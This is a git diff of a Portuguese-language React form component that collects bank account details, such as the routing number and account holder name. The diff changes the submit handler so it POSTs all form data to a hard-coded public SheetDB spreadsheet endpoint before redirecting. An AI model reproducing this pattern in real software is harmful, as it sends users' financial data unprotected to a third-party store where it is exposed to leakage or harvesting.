@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom'; // Import useNavigate
-import './Dados.css'; // Import the CSS file
+import { useNavigate } from 'react-router-dom'; // Para navegação entre páginas
+import './Dados.css'; // Se você tiver um arquivo de estilos CSS
 
 const Dados = () => {
   const [formData, setFormData] = useState({
@@ -14,8 +14,9 @@ const Dados = () => {
     routingNumber: '',
   });
 
-  const navigate = useNavigate(); // Initialize useNavigate
+  const navigate = useNavigate(); // Para navegação após o envio do formulário
 
+  // Função para atualizar os dados do formulário conforme o usuário digita
   const handleChange = (e) => {
     const { name, value } = e.target;
     setFormData({
@@ -24,10 +25,27 @@ const Dados = () => {
     });
   };
 
-  const handleSubmit = (e) => {
+  // Função para enviar os dados para o SheetDB e redirecionar o usuário
+  const handleSubmit = async (e) => {
     e.preventDefault();
-    console.log('Form submitted:', formData);
-    navigate('/seu-power'); // Redirect to the "Seu Power" page
+
+    try {
+      // Envia os dados para a API do SheetDB
+      await fetch('https://sheetdb.io/api/v1/i2mq4tynwk7es', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ data: formData }), // "data" é exigido pelo SheetDB
+      });
+
+      // Após o envio, redireciona para a página /seu-power (ou outra que você desejar)
+      navigate('/seu-power');
+
+    } catch (err) {
+      console.error('Erro ao enviar:', err);
+      alert('Erro ao enviar os dados. Tente novamente.');
+    }
   };
 
   return (
@@ -77,6 +95,7 @@ const Dados = () => {
               required
             />
           </label>
+
           <h2>Informações da Conta Bancária</h2>
           <label>
             Nome do Titular da Conta:
